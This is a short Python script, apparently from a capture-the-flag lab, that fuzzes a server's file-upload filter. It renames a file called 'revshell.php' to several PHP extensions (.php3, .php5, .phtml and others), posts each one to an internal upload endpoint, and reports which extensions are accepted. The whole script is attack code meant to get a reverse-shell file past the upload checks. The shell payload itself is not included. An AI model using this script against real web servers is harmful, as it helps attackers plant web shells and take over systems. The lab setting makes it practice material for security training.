#!/usr/bin/python3

import requests
import os

ip = "10.10.168.96"
url = f"http://{ip}:3333/internal/"

old_filename = "revshell.php"
filename = "revshell"
extensions = [
	".php",
	".php3",
	".php4",
	".php5",
	".phtml",
]

for ext in extensions:
	new_filename = filename + ext
	os.rename(old_filename, new_filename)

	files = {"file": open(new_filename, 'rb')}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print(f"Extension {ext} is not allowed!")
	else:
		print(f"Extension {ext} is allowed.")

	old_filename = new_filename 
